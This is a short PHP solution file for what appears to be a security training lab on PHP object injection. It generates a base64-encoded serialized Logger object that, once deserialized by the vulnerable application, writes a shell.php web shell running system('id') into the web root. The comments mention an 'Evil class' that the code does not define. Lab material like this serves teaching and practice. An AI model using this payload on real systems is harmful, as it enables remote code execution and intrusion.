<?php
// This file is the key of this Lab. You should only see this file if you don't know how to exploit the vulnerability. 
// It contains the payload that will be used to exploit the vulnerability in the Logger class.
// The payload is a serialized object of the Evil class, which extends the Logger class.
// The Evil class overrides the $logFile and $message properties to execute a shell command when the object is destroyed.
// The payload is then base64 encoded and printed to the console.
// Run this file in the terminal of attacker machine to generate the payload. (php exploit.php)
class Logger {
    public $logFile = 'shell.php'; // write shell.php in /var/www/html
    public $message = "<?php system('id'); ?>"; // execute id command in shell.php
}

echo "Payload:\n";
echo base64_encode(serialize(new Logger()));
?>